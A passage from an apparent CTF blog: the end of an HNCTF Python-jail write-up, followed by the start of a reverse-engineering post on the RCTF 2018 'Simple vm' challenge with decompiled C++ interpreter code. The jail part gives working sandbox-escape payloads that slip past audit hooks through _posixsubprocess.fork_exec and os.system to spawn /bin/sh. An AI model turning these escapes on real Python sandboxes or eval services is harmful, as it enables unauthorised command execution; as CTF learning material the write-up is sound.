<h3 id="LEVEL-6"><a href="#LEVEL-6" class="headerlink" title="LEVEL 6"></a>LEVEL 6</h3><h4 id="repetition"><a href="#repetition" class="headerlink" title="repetition:"></a>repetition:</h4><p><img src="/2022/11/01/pythonJail/level6wp1.png" alt="level6wp1"><br><img src="/2022/11/01/pythonJail/level6wp2.png" alt="level6wp2"><br><img src="/2022/11/01/pythonJail/level6wp3.png" alt="level6wp3"></p>
<h5 id="link-that-may-help-you"><a href="#link-that-may-help-you" class="headerlink" title="link that may help you"></a><a href="https://ctftime.org/writeup/31883">link that may help you</a></h5><h5 id="The-basic-idea-is-to-RCE-with-posixsubprocess-fork-exec-If-we-import-it-directly-it-will-trigger-the-audit-hook-But-we-can-pass-it-by-using-builtins-39-loader-39-load-module-39-posixsubprocess-39-or-loader-load-module-39-posixsubprocess-39-Also-due-to-its-repeatedly-exct-we-just-shell-like-this"><a href="#The-basic-idea-is-to-RCE-with-posixsubprocess-fork-exec-If-we-import-it-directly-it-will-trigger-the-audit-hook-But-we-can-pass-it-by-using-builtins-39-loader-39-load-module-39-posixsubprocess-39-or-loader-load-module-39-posixsubprocess-39-Also-due-to-its-repeatedly-exct-we-just-shell-like-this" class="headerlink" title="The basic idea is to RCE with _posixsubprocess.fork_exec. If we import it directly, it will trigger the audit hook. But we can pass it by using __builtins__[&#39;__loader__&#39;].load_module(&#39;_posixsubprocess&#39;) or __loader__.load_module(&#39;_posixsubprocess&#39;). Also, due to its repeatedly exct, we just shell like this:"></a>The basic idea is to RCE with <code>_posixsubprocess.fork_exec</code>. If we import it directly, it will trigger the audit hook. But we can pass it by using <code>__builtins__[&#39;__loader__&#39;].load_module(&#39;_posixsubprocess&#39;)</code> or <code>__loader__.load_module(&#39;_posixsubprocess&#39;)</code>. Also, due to its repeatedly exct, we just shell like this:</h5><pre><code>import os
__loader__.load_module(&#39;_posixsubprocess&#39;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
</code></pre>
<h3 id="LEVEL-6-1"><a href="#LEVEL-6-1" class="headerlink" title="LEVEL 6.1"></a>LEVEL 6.1</h3><h5 id="This-time-we-only-got-one-time-to-excute-our-payload-Though-we-our-learning-above-we-know-that-walrus-operator-can-help-us-Also-the-shell-will-shut-immediately-the-blogger-think-of-a-interesting-way-to-overcome-this-by-brute-force-getting-shell-over-and-over-again-and-try-to-input-command-That-works"><a href="#This-time-we-only-got-one-time-to-excute-our-payload-Though-we-our-learning-above-we-know-that-walrus-operator-can-help-us-Also-the-shell-will-shut-immediately-the-blogger-think-of-a-interesting-way-to-overcome-this-by-brute-force-getting-shell-over-and-over-again-and-try-to-input-command-That-works" class="headerlink" title="This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works."></a>This time, we only got one time to excute our payload. Though, we our learning above, we know that walrus operator can help us. Also, the shell will shut immediately, the blogger think of a interesting way to overcome this, by brute force, getting shell over and over again and try to input command. That works.</h5><p><img src="/2022/11/01/pythonJail/level6.1wp.png" alt="level6.1wp"></p>
<h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h5><pre><code>[os := __import__(&#39;os&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in range(100000)]]
</code></pre>
<h5 id="or"><a href="#or" class="headerlink" title="or"></a>or</h5><pre><code>[os := __import__(&#39;os&#39;), itertools := __loader__.load_module(&#39;itertools&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]
</code></pre>
<h3 id="SAFEEVAL"><a href="#SAFEEVAL" class="headerlink" title="SAFEEVAL"></a>SAFEEVAL</h3><h5 id="Use-lambda-to-wrap-up-RCE"><a href="#Use-lambda-to-wrap-up-RCE" class="headerlink" title="Use lambda to wrap up RCE"></a>Use lambda to wrap up RCE</h5><h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h5><pre><code>(lambda: __import__(&#39;os&#39;).system(&#39;sh&#39;))()
</code></pre>
<p><img src="/2022/11/01/pythonJail/safeeval_1.png" alt="safeeval"><br><img src="/2022/11/01/pythonJail/safeeval_2.png" alt="safeeval"></p>
<h3 id="LEVEL7"><a href="#LEVEL7" class="headerlink" title="LEVEL7"></a>LEVEL7</h3><h6 id="Come-back-later-to-try-to-figure-it-out…"><a href="#Come-back-later-to-try-to-figure-it-out…" class="headerlink" title="Come back later to try to figure it out…"></a>Come back later to try to figure it out…</h6><h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h5><blockquote>
<p>@exec<br> @input<br> class X: pass</p>
</blockquote>
<blockquote>
<p><strong>import</strong>(‘os’).system(‘sh’)</p>
</blockquote>
<h5 id="blog"><a href="#blog" class="headerlink" title="blog"></a><a href="https://gynvael.coldwind.pl/n/python_sandbox_escape">blog</a></h5><pre><code>↑# [organizers] Robin_Jadoul solution↑
</code></pre>
<p><img src="/2022/11/01/pythonJail/level7wp1.png" alt="level7"><br><img src="/2022/11/01/pythonJail/level7wp2.png" alt="level7"></p>
<h3 id="Ok-so-that’s-the-end-of-the-hnctf-There-are-some-thing-that-may-help-you-get-further-about-pyjail"><a href="#Ok-so-that’s-the-end-of-the-hnctf-There-are-some-thing-that-may-help-you-get-further-about-pyjail" class="headerlink" title="Ok, so that’s the end of the hnctf. There are some thing that may help you get further about pyjail:"></a>Ok, so that’s the end of the hnctf. There are some thing that may help you get further about pyjail:</h3><pre><code>https://gynvael.coldwind.pl/n/python_sandbox_escape

https://www.youtube.com/watch?v=Ub_BMOMDOx0

https://zhuanlan.zhihu.com/p/578966149
</code></pre>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>jail</tag>
      </tags>
  </entry>
  <entry>
    <title>VM</title>
    <url>/2023/03/03/VM/</url>
    <content><![CDATA[<h4 id="preface"><a href="#preface" class="headerlink" title="preface"></a>preface</h4><h5 id="It’s-quite-a-while-since-last-been-working-out-a-reverse-problems-When-came-into-a-VM-golang-problem-in-VNCTF-I-spent-much-time-but-done-nothing-So-here-I-collect-some-VM-problems-and-tried-to-get-better-understand-of-the-thing"><a href="#It’s-quite-a-while-since-last-been-working-out-a-reverse-problems-When-came-into-a-VM-golang-problem-in-VNCTF-I-spent-much-time-but-done-nothing-So-here-I-collect-some-VM-problems-and-tried-to-get-better-understand-of-the-thing" class="headerlink" title="It’s quite a while since last been working out a reverse problems. When came into a VM(golang) problem in VNCTF, I spent much time but done nothing. So here I collect some VM problems and tried to get better understand of the thing."></a>It’s quite a while since last been working out a reverse problems. When came into a VM(golang) problem in VNCTF, I spent much time but done nothing. So here I collect some VM problems and tried to get better understand of the thing.</h5><span id="more"></span>
<h3 id="RCTF-2018-Simple-vm"><a href="#RCTF-2018-Simple-vm" class="headerlink" title="RCTF 2018 Simple vm"></a>RCTF 2018 Simple vm</h3><p><img src="/2023/03/03/VM/VM%5Cmain.png" alt="main"></p>
<h5 id="From-the-main-function-we-see-that-v3-read-the-p-bin-file-By-searching-I-marked-the-main-function-like-this"><a href="#From-the-main-function-we-see-that-v3-read-the-p-bin-file-By-searching-I-marked-the-main-function-like-this" class="headerlink" title="From the main function, we see that v3 read the p.bin file. By searching, I marked the main function like this:"></a>From the main function, we see that v3 read the <code>p.bin</code> file. By <a href="https://cplusplus.com/reference/cstdio/fseek/">searching</a>, I marked the main function like this:</h5><p><img src="/2023/03/03/VM/VM%5Cmain_0.png" alt="main_0"></p>
<h5 id="And-we-know-that-sub-400896-is-where-VM-runs-So-we-can-add-breakpoint-then-step-in-and-dynamic-debug-the-function"><a href="#And-we-know-that-sub-400896-is-where-VM-runs-So-we-can-add-breakpoint-then-step-in-and-dynamic-debug-the-function" class="headerlink" title="And we know that sub_400896 is where VM runs. So we can add breakpoint then step in and dynamic debug the function."></a>And we know that <code>sub_400896</code> is where VM runs. So we can add breakpoint then step in and dynamic debug the function.</h5><p><img src="/2023/03/03/VM/VM%5Csub_400896.png" alt="sub_400896"></p>
<h5 id="We-can-see-that-ptr-is-a-address-and-v1-seems-like-our-opcode-Well-if-it’s-the-first-time-you-do-a-vm-problem-you-might-still-confuse-about-what-happen-here-Howerver-we-can-stimulate-the-program-our-self"><a href="#We-can-see-that-ptr-is-a-address-and-v1-seems-like-our-opcode-Well-if-it’s-the-first-time-you-do-a-vm-problem-you-might-still-confuse-about-what-happen-here-Howerver-we-can-stimulate-the-program-our-self" class="headerlink" title="We can see that ptr is a address and v1[] seems like our opcode. Well, if it’s the first time you do a vm problem, you might still confuse about what happen here. Howerver, we can stimulate the program our self:"></a>We can see that <code>ptr</code> is a address and <code>v1[]</code> seems like our opcode. Well, if it’s the first time you do a vm problem, you might still confuse about what happen here. Howerver, we can stimulate the program our self:</h5><style>
pre {
  overflow-y: auto;
  max-height: 300px;
}
</style>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">    <span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> _BYTE unsigned char</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> _DWORD unsigned int</span></span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> length_of_file;</span><br><span class="line">    <span class="type">void</span> * ptr;</span><br><span class="line">    <span class="function">__int64 <span class="title">sub_400896</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="type">int</span> dword_6010A4;</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        FILE *v3; <span class="comment">// rax</span></span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rdi</span></span><br><span class="line">        FILE *v5; <span class="comment">// rbx</span></span><br><span class="line">        <span class="type">size_t</span> v6; <span class="comment">// rbp</span></span><br><span class="line">        <span class="type">void</span> *v8; <span class="comment">// rax</span></span><br><span class="line">        </span><br><span class="line">        v3 = <span class="built_in">fopen</span>(<span class="string">&quot;p.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">        v4 = <span class="string">&quot;err 0&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">        v5 = v3;</span><br><span class="line">        <span class="built_in">fseek</span>(v3, <span class="number">0LL</span>, <span class="number">2</span>);</span><br><span class="line">        length_of_file = <span class="built_in">ftell</span>(v5);</span><br><span class="line">        <span class="built_in">fseek</span>(v5, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">        v6 = length_of_file;</span><br><span class="line">        <span class="keyword">if</span> ( length_of_file &lt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v4 = <span class="string">&quot;err 1&quot;</span>;</span><br><span class="line">            LABEL_4:</span><br><span class="line">                <span class="built_in">puts</span>(v4);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">        &#125;</span><br><span class="line">        v8 = <span class="built_in">malloc</span>(length_of_file);</span><br><span class="line">        ptr = v8;</span><br><span class="line">        v4 = <span class="string">&quot;err 3&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v8 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">        v4 = <span class="string">&quot;err 4&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( length_of_file != <span class="built_in">fread</span>(v8, <span class="number">1uLL</span>, v6, v5) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">        <span class="built_in">fclose</span>(v5);</span><br><span class="line">        v4 = <span class="string">&quot;err 5&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">sub_400896</span>() )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">__int64 <span class="title">sub_400896</span><span class="params">()</span></span>&#123;</span><br><span class="line">        __int64 v0; <span class="comment">// rax</span></span><br><span class="line">        _BYTE *v1; <span class="comment">// rbp</span></span><br><span class="line">        <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">        __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">        __int64 v5; <span class="comment">// rax</span></span><br><span class="line">        __int64 v6; <span class="comment">// rax</span></span><br><span class="line">        __int64 v7; <span class="comment">// rax</span></span><br><span class="line">        __int64 v8; <span class="comment">// rax</span></span><br><span class="line">        __int64 v9; <span class="comment">// rax</span></span><br><span class="line">        <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">        __int64 v11; <span class="comment">// rax</span></span><br><span class="line">        <span class="type">char</span> v12; <span class="comment">// dl</span></span><br><span class="line">        <span class="type">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">        <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">        _BYTE *v15; <span class="comment">// rax</span></span><br><span class="line">        __int64 v16; <span class="comment">// rax</span></span><br><span class="line">        __int64 v17; <span class="comment">// rax</span></span><br><span class="line">        __int64 v18; <span class="comment">// rax</span></span><br><span class="line">        </span><br><span class="line">        v0 = <span class="number">0LL</span>;</span><br><span class="line">        v1 = (<span class="type">unsigned</span> <span class="type">char</span>*)ptr;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v2 = v0 + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">switch</span> ( v1[v0] )</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v1[v2];</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                v4 = v2;</span><br><span class="line">                v2 = v0 + <span class="number">9</span>;</span><br><span class="line">                v1[*(<span class="type">int</span> *)&amp;v1[v4]] = *(_DWORD *)&amp;v1[(<span class="type">int</span>)v0 + <span class="number">5</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                v5 = v2;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v6 = *(<span class="type">int</span> *)&amp;v1[v5];</span><br><span class="line">                <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                v7 = v2;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v8 = *(<span class="type">int</span> *)&amp;v1[v7];</span><br><span class="line">                <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                v9 = v2;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v10 = (<span class="type">char</span>)v1[*(<span class="type">int</span> *)&amp;v1[v9]];</span><br><span class="line">                <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                v11 = v2;</span><br><span class="line">                v12 = dword_6010A4;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v8 = *(<span class="type">int</span> *)&amp;v1[v11];</span><br><span class="line">                <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                v13 = dword_6010A4;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                v14 = ~(dword_6010A4 &amp; c);</span><br><span class="line">                <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">                v14 = <span class="built_in">getchar</span>();</span><br><span class="line">                <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xB</span>:</span><br><span class="line">                <span class="built_in">putchar</span>(c);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">                v15 = &amp;v1[*(<span class="type">int</span> *)&amp;v1[v2]];</span><br><span class="line">                <span class="keyword">if</span> ( *v15 )&#123;</span><br><span class="line">                    v2 = *(_DWORD *)&amp;v1[v2 + <span class="number">4</span>];</span><br><span class="line">                    --*v15;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    v2 += <span class="number">8</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xD</span>:</span><br><span class="line">                ++c;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xE</span>:</span><br><span class="line">                ++dword_6010A4;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0xF</span>:</span><br><span class="line">                v14 = dword_6010A4;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">                v10 = c;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">                v16 = v2;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v13 = *(_DWORD *)&amp;v1[v16];</span><br><span class="line">                LABEL_23:</span><br><span class="line">                    c += v13;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x12</span>:</span><br><span class="line">                v6 = dword_6010A4;</span><br><span class="line">                <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">                v6 = c;</span><br><span class="line">                LABEL_27:</span><br><span class="line">                    v14 = (<span class="type">char</span>)v1[v6];</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">                v17 = v2;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v14 = *(_DWORD *)&amp;v1[v17];</span><br><span class="line">                <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x15</span>:</span><br><span class="line">                v18 = v2;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v10 = *(_DWORD *)&amp;v1[v18];</span><br><span class="line">                LABEL_21:</span><br><span class="line">                    dword_6010A4 = v10;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x16</span>:</span><br><span class="line">                v8 = dword_6010A4;</span><br><span class="line">                LABEL_31:</span><br><span class="line">                    v12 = c;</span><br><span class="line">                    LABEL_9:</span><br><span class="line">                        v1[v8] = v12;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x17</span>:</span><br><span class="line">                v14 = c - dword_6010A4;</span><br><span class="line">                LABEL_12:</span><br><span class="line">                    c = v14;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0x18</span>:</span><br><span class="line">                <span class="keyword">if</span> ( c )</span><br><span class="line">                    LABEL_35:</span><br><span class="line">                        v2 = *(_DWORD *)&amp;v1[v2];</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    v2 = v0 + <span class="number">5</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v2 &gt;= length_of_file )</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">            v0 = v2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">```    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####<span class="meta"># and we can add some outputs, so as to understand this program:</span></span><br><span class="line">```cpp</span><br><span class="line">    <span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> _BYTE unsigned char</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> _DWORD unsigned int</span></span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> length_of_file;</span><br><span class="line">    <span class="type">void</span> * ptr;</span><br><span class="line">    <span class="function">__int64 <span class="title">sub_400896</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="type">int</span> dword_6010A4;</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ofstream outfile;</span><br><span class="line">        FILE *v3; <span class="comment">// rax</span></span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rdi</span></span><br><span class="line">        FILE *v5; <span class="comment">// rbx</span></span><br><span class="line">        <span class="type">size_t</span> v6; <span class="comment">// rbp</span></span><br><span class="line">        <span class="type">void</span> *v8; <span class="comment">// rax</span></span><br><span class="line">        </span><br><span class="line">        v3 = <span class="built_in">fopen</span>(<span class="string">&quot;p.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">        v4 = <span class="string">&quot;err 0&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">        v5 = v3;</span><br><span class="line">        <span class="built_in">fseek</span>(v3, <span class="number">0LL</span>, <span class="number">2</span>);</span><br><span class="line">        length_of_file = <span class="built_in">ftell</span>(v5);</span><br><span class="line">        <span class="built_in">fseek</span>(v5, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">        v6 = length_of_file;</span><br><span class="line">        <span class="keyword">if</span> ( length_of_file &lt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v4 = <span class="string">&quot;err 1&quot;</span>;</span><br><span class="line">            LABEL_4:</span><br><span class="line">                <span class="built_in">puts</span>(v4);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">        &#125;</span><br><span class="line">        v8 = <span class="built_in">malloc</span>(length_of_file);</span><br><span class="line">        ptr = v8;</span><br><span class="line">        v4 = <span class="string">&quot;err 3&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v8 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">        v4 = <span class="string">&quot;err 4&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">long</span> <span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span>)length_of_file != <span class="built_in">fread</span>(v8, <span class="number">1uLL</span>, v6, v5) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">        <span class="built_in">fclose</span>(v5);</span><br><span class="line">        v4 = <span class="string">&quot;err 5&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">sub_400896</span>() )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">__int64 <span class="title">sub_400896</span><span class="params">()</span></span>&#123;</span><br><span class="line">        __int64 v0; <span class="comment">// rax</span></span><br><span class="line">        _BYTE *v1; <span class="comment">// rbp</span></span><br><span class="line">        <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">        __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">        __int64 v5; <span class="comment">// rax</span></span><br><span class="line">        __int64 v6; <span class="comment">// rax</span></span><br><span class="line">        __int64 v7; <span class="comment">// rax</span></span><br><span class="line">        __int64 v8; <span class="comment">// rax</span></span><br><span class="line">        __int64 v9; <span class="comment">// rax</span></span><br><span class="line">        <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">        __int64 v11; <span class="comment">// rax</span></span><br><span class="line">        <span class="type">char</span> v12; <span class="comment">// dl</span></span><br><span class="line">        <span class="type">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">        <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">        _BYTE *v15; <span class="comment">// rax</span></span><br><span class="line">        __int64 v16; <span class="comment">// rax</span></span><br><span class="line">        __int64 v17; <span class="comment">// rax</span></span><br><span class="line">        __int64 v18; <span class="comment">// rax</span></span><br><span class="line">        </span><br><span class="line">        v0 = <span class="number">0LL</span>;</span><br><span class="line">        v1 = (<span class="type">unsigned</span> <span class="type">char</span>*)ptr;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v2 = v0 + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//    printf(&quot;v2 = v0 + 1;\n&quot;);</span></span><br><span class="line">            <span class="keyword">switch</span> ( v1[v0] )</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;return \n&quot;</span>&lt;&lt;*(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v1[v2]&lt;&lt;endl;</span><br><span class="line">                <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v1[v2];</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                v4 = v2;</span><br><span class="line">                v2 = v0 + <span class="number">9</span>;</span><br><span class="line">                v1[*(<span class="type">int</span> *)&amp;v1[v4]] = *(_DWORD *)&amp;v1[(<span class="type">int</span>)v0 + <span class="number">5</span>];</span><br><span class="line">    <span class="comment">//      printf(&quot;v4 = v2\n&quot;);</span></span><br><span class="line">    <span class="comment">//      printf(&quot;v2 = v0 + 9\n&quot;);</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v1[%d] = %u\n&quot;</span>,*(<span class="type">int</span> *)&amp;v1[v4],*(_DWORD *)&amp;v1[(<span class="type">int</span>)v0 + <span class="number">5</span>]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                v5 = v2;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v6 = *(<span class="type">int</span> *)&amp;v1[v5];</span><br><span class="line">    <span class="comment">//      printf(&quot;v5 = v2\n&quot;);</span></span><br><span class="line">    <span class="comment">//      printf(&quot;v2 += 4\n&quot;);</span></span><br><span class="line">    <span class="comment">//      printf(&quot;v6 = v1[%lld] (%d)\n&quot;,v5,*(int *)&amp;v1[v5]);</span></span><br><span class="line">                <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                v7 = v2;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v8 = *(<span class="type">int</span> *)&amp;v1[v7];</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v7 = v2\n&quot;</span>);</span><br><span class="line">    <span class="comment">//      printf(&quot;v2 += 4\n&quot;);</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;v8 = v1[%lld] (%d)\n&quot;</span>,v7,*(<span class="type">int</span> *)&amp;v1[v7]);</span><br><span class="line">                <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                v9 = v2;</span><br><span class="line">                v2 += <span class="number">4</span>;</span><br><span class="line">                v10 = 